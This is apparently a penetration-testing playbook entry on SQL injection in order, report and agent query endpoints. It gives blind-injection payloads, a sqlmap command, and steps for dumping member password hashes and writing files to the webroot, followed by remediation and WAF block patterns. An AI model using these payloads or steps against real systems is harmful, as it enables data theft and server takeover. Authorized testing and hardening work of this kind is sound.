---
title: SQL injection in business endpoints (reports / orders / agent queries)
cve: None (implementation flaw)
severity: critical
cvss: 9.8
product: Custom reporting and query endpoints
versions: Any
ports: 80, 443
keywords: sqli, injection, orderNo, agentId, reports, blind injection, union
entry: orderNo=1' AND SLEEP(5)--
verified: false
sources: Compiled from public sources (implementation flaws; no CVE)
---

## Fingerprints

- Report/export/list endpoint parameters are concatenated directly into SQL: `orderNo`, `agentId`, `date`, `sort`, `order`.
- Error pages contain `SQL syntax`, `MySQL`, `ORA-`, `ODBC`.

## Prerequisites

- An account (some reports require agent or admin privileges; many sites also concatenate SQL in frontend order queries).
- Authorized testing; avoid saturating production with `SLEEP`.

## PoC

```http
### Time-based blind injection
GET /api/order/query?orderNo=20241105001'%20AND%20SLEEP(5)--%20- HTTP/1.1
Authorization: Bearer <token>

### Boolean-based blind injection
GET /api/report/bet?agentId=1'%20AND%201=1--%20- HTTP/1.1
GET /api/report/bet?agentId=1'%20AND%201=2--%20- HTTP/1.1
```

```bash
# Specify the target parameter in sqlmap (low concurrency to avoid triggering risk controls)
sqlmap -r req.txt -p orderNo --batch --level 2 --risk 2 --threads 2 --dbms mysql
```

## Exploitation Steps

1. Start with a single-quote probe (errors/500/delay differences) to identify the injection point.
2. Confirm with time-based blind injection (compare `SLEEP(3)`), then `UNION SELECT version(),database()`.
3. Read key tables: `member` (phone numbers/password hashes), `order`, `withdraw`, `admin_user`.
4. With `FILE` privileges, use `INTO OUTFILE` to write to webroot; otherwise use UDF or limit access to reading data.
5. Evidence: two delay comparisons + `version()` output; list only table names and fields in the report, without exporting data.

## Remediation and Mitigation (Hardening)

- Use parameterized queries throughout (prepared statements); prohibit string-concatenated SQL.
- Least-privilege DB accounts (no `FILE`, no cross-database access); consistent error pages (no SQL output).
- Block combinations of `SLEEP(`, `UNION SELECT`, `--` at the WAF; rate-limit query endpoints.

## References

- OWASP WSTG-INPV-05; sqlmap documentation.
